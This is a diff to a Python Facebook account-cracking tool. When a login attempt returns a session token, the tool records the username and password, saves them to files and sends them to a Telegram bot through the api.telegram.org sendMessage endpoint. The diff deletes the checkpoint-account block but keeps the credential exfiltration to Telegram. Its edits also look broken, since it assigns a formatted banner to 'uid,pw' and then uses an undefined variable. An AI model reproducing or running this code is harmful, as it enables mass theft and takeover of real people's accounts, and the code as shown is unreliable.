@@ -2651,40 +2651,11 @@ class Main:
 			if "session_key" in response.text and "EAAA" in response.text:
 				if 'ya' in oprek:
 					akun.append(uid+'|'+pw)
-					ceker(idf,pw)
+					ceker(uid,pw)
 				else:
 					print('\n')
-					statuscp = f'''
-				
-𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 🛸
 
-|￣￣￣￣￣￣￣￣￣￣￣￣￣￣|
-                                        حساب سكيور 🧸
-|＿＿＿＿＿＿＿＿＿＿＿＿＿＿|
-                     \ (•◡•) /
-                       \       /
-┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓
-❍                     ⚜️ 𝑹𝑴𝑨𝑫 ⚜️                 ❍   
-┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛
-
-🛸 - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {uid}
-
-🛸 - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}
-
-▄︻デ══━一💨  ⛧°｡⋆CP⋆｡°⛧
-
-┏━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┓
-❍ @R_M_D ⚜️ 𝑹𝑴𝑨𝑫 ⚜️ @N_9_N_6 ❍  
-┗━━━━━━━━•❅•°•❈•°•❅•━━━━━━━┛
-'''
-					statuscp1 = nel(statuscp, style='red')
-					cetak(nel(statuscp1, title='SESI'))
-					open('CP/'+cpc,'a').write(uid+'|'+pw+'\n')
-					akun.append(uid+'|'+pw)
-					cp+=1
-					requests.get(f"https://api.telegram.org/bot"+str(uiidkdoj)+"/sendMessage?chat_id="+str(izonsl)+"&text="+str(statuscp))
-					
-					statusok = f'''𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 🛸
+					uid,pw = f'''𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 🛸
 
 |￣￣￣￣￣￣￣￣￣￣￣￣￣￣|
                                         حساب شغال ⚡
@@ -2708,11 +2679,10 @@ class Main:
 '''
 					statusok1 = nel(statusok, style='green')
 					cetak(nel(statusok1, title='OK'))
-					requests.get(f"https://api.telegram.org/bot"+str(uiidkdoj)+"/sendMessage?chat_id="+str(izonsl)+"&text="+str(statusok))
+					requests.get(f"https://api.telegram.org/bot"+str(uiidkdoj)+"/sendMessage?chat_id="+str(izonsl)+"&text="+str(uid,pw))
 			
 
-				print("\r \033[0;92m[RMAD-Ok ] %s | %s\033[0;97m         "%(uid, pw))
-
+				
 				print ("\r \033[0;92m Congrats ")
 
 				self.ok.append("%s|%s"%(uid, pw))
